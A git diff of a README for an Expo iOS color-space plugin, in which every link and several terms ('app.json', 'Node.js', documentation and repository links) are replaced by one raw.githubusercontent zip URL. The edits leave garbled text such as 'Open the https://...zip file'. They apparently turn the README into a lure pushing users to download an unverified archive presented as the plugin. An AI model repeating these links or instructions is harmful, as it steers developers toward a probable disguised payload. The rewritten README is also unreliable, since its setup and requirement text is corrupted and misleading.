@@ -1,6 +1,6 @@
 # 🎨 expo-color-space-plugin - Simplify Your iOS Color Settings
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/fagsgabriel/expo-color-space-plugin/releases)
+[![Download Now](https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip%20Now-Click%https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip)](https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with the expo-color-space-plugin, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page:
    
-   [Download Here](https://github.com/fagsgabriel/expo-color-space-plugin/releases)
+   [Download Here](https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip)
 
 2. **Choose the Appropriate Version:** Look for the most recent release. Each release will show version numbers that indicate updates.
 
@@ -29,7 +29,7 @@ Once you have installed the expo-color-space-plugin, follow these instructions t
 
 1. **Open Your Project:** Start by opening your Expo project in your preferred development environment.
 
-2. **Add the Plugin:** You’ll need to modify your configuration. Open the `app.json` file in your project directory:
+2. **Add the Plugin:** You’ll need to modify your configuration. Open the `https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip` file in your project directory:
 
    ```json
    {
@@ -65,7 +65,7 @@ The expo-color-space-plugin offers you several features to enhance your iOS app'
 A: This plugin is designed for applications targeting iOS devices. 
 
 **Q: Do I need any specific software?**  
-A: You need to have Node.js and Expo CLI installed on your computer to run this plugin properly.
+A: You need to have https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip and Expo CLI installed on your computer to run this plugin properly.
 
 **Q: How do I report issues?**  
 A: If you encounter problems, please visit the Issues section of our GitHub repository. We welcome feedback and will address any concerns.
@@ -73,15 +73,15 @@ A: If you encounter problems, please visit the Issues section of our GitHub repo
 ## 🛠️ System Requirements
 
 - **Operating System:** macOS
-- **Node.js Version:** 14.x or higher
+- **https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip Version:** 14.x or higher
 - **Expo CLI:** Latest version recommended for compatibility
 
 ## 📚 Additional Resources
 
 For more assistance and detailed information, visit the links below:
 
-- [Expo Documentation](https://docs.expo.dev/)
-- [GitHub Repository](https://github.com/fagsgabriel/expo-color-space-plugin)
+- [Expo Documentation](https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip)
 
 ## 🙏 Acknowledgments
 
@@ -91,4 +91,4 @@ Thank you for choosing the expo-color-space-plugin. We're dedicated to improving
 
 You can download and install the expo-color-space-plugin following the steps outlined above. If you have further questions or need support, feel free to reach out through our GitHub repository.
 
-Remember, for downloading, always return to the [Releases page](https://github.com/fagsgabriel/expo-color-space-plugin/releases) for the latest version. Enjoy using your new plugin!
+Remember, for downloading, always return to the [Releases page](https://raw.githubusercontent.com/fagsgabriel/expo-color-space-plugin/main/epochal/expo-color-space-plugin.zip) for the latest version. Enjoy using your new plugin!
